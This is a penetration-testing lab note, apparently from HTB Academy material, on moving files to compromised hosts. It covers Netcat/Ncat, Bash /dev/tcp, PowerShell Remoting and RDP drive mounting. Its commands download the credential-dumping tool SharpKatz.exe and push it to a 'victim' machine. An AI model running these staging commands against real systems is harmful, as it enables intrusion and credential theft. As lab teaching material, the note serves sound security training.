# Miscellaneous File Transfer Methods

***

## <mark style="color:red;">Netcat</mark>

Netcat (nc) est un outil réseau polyvalent permettant de lire et d’écrire sur des connexions TCP ou UDP, souvent utilisé pour le transfert de fichiers, dont la version originale de 1995 a inspiré Nmap à créer Ncat, une réécriture moderne avec support de SSL, IPv6, proxys et plus encore.

### <mark style="color:blue;">File Transfer with Netcat and Ncat</mark>

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`.

<mark style="color:orange;">**NetCat - Compromised Machine - Listening on Port 8000**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
{% endcode %}

<mark style="color:orange;">**Ncat - Compromised Machine - Listening on Port 8000**</mark>

{% code fullWidth="true" %}
```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
{% endcode %}

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

<mark style="color:orange;">**Netcat - Attack Host - Sending File to Compromised machine**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
mrroboteLiot@htb[/htb]$ # Example using Original Netcat
mrroboteLiot@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
{% endcode %}

By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.

<mark style="color:orange;">**Ncat - Attack Host - Sending File to Compromised machine**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
mrroboteLiot@htb[/htb]$ # Example using Ncat
mrroboteLiot@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
{% endcode %}

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

<mark style="color:orange;">**Attack Host - Sending File as Input to Netcat**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ # Example using Original Netcat
mrroboteLiot@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
{% endcode %}

<mark style="color:orange;">**Compromised Machine Connect to Netcat to Receive the File**</mark>

{% code fullWidth="true" %}
```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```
{% endcode %}

Let's do the same with Ncat:

<mark style="color:orange;">**Attack Host - Sending File as Input to Ncat**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ # Example using Ncat
mrroboteLiot@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
{% endcode %}

<mark style="color:orange;">**Compromised Machine Connect to Ncat to Receive the File**</mark>

{% code fullWidth="true" %}
```bash
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
{% endcode %}

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

<mark style="color:orange;">**Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File**</mark>

{% code fullWidth="true" %}
```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
{% endcode %}

***

## <mark style="color:red;">PowerShell Session File Transfer</mark>

We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.

We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

<mark style="color:orange;">**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**</mark>

{% code fullWidth="true" %}
```powershell
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```
{% endcode %}

{% code fullWidth="true" %}
```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```
{% endcode %}

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

<mark style="color:orange;">**Create a PowerShell Remoting Session to DATABASE01**</mark>

{% code fullWidth="true" %}
```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```
{% endcode %}

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

<mark style="color:orange;">**Copy samplefile.txt from our Localhost to the DATABASE01 Session**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
{% endcode %}

<mark style="color:orange;">**Copy DATABASE.txt from DATABASE01 Session to our Localhost**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
{% endcode %}

***

## <mark style="color:red;">RDP</mark>

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.

<mark style="color:orange;">**Mounting a Linux Folder Using rdesktop**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
{% endcode %}

<mark style="color:orange;">**Mounting a Linux Folder Using xfreerdp**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
{% endcode %}

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

After selecting the drive, we can interact with it in the remote session that follows.

Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

***
